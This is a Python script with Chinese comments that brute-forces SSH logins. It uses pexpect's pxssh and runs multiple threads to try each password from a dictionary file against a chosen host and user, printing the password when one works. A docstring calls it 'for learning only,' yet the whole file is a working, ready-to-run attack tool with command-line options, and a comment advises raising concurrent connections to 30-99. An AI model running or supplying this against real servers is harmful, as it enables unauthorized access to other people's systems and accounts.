# coding=UTF-8 
from pexpect import pxssh
import optparse
import time 
import threading
"""
本脚本用过密码字典暴力破解远程ssh密码。
仅供学习,请勿用于其他用途。
"""
maxConnections = 5 #每次最大连接数,亲自试验建议设为30-99
connection_lock = threading.BoundedSemaphore(value=maxConnections)#线程连接数，每个线程最大连接数
Found = False #密码破解状况，初始化为false
Fails = 0

def connect(host, user, password, release):    
	global Found, Fails #全局变量
	try:        
		s = pxssh.pxssh()   #建立ssh
		s.login(host, user, password)  #登录
		print('[+] Password is: ' + password)   #登录成功，显示密码
		Found = True  #破解状况变为Ture
	except Exception as e: #出现异常时候，线程进入睡眠，然后再用刚才的密码登录一次   
		if 'read_nonblocking' in str(e): 
			Fails += 1            
			time.sleep(5)            
			connect(host, user, password, False)        
		elif 'synchronize with original prompt' in str(e):            
			time.sleep(1)            
			connect(host, user, password, False)
	finally:
		if release:            
			connection_lock.release()#释放线程锁

def main():
	parser = optparse.OptionParser('usage%prog '+'-H <target host> -u <user> -f <password list>')#建立命令参数
	parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')#设置主机
	parser.add_option('-f', dest='passwdFile', type='string', help='specify password file')#设置密码字典文件
	parser.add_option('-u', dest='user', type='string', help='specify the user')#设置用户    
	(options, args) = parser.parse_args()    
	host = options.tgtHost    
	passwdFile = options.passwdFile    
	user = options.user    
	if host == None or passwdFile == None or user == None:        
		print(parser.usage)        
		exit(0)    
	fn = open(passwdFile, 'r')    
	for line in fn:        
		if Found:            
			print("[*] Exiting: Password Found")
			exit(0)            
			if Fails > 5:                
				print("[!] Exiting: Too Many Socket Timeouts")
				exit(0)        
		connection_lock.acquire()#锁定线程
		password = line.strip('\r').strip('\n')
		print("[-] Testing: " + str(password))        
		t = threading.Thread(target=connect, args=(host, user, password, True))#调用线程
		t.start()#开启线程进行密码破解

if __name__ == '__main__':    
	main()
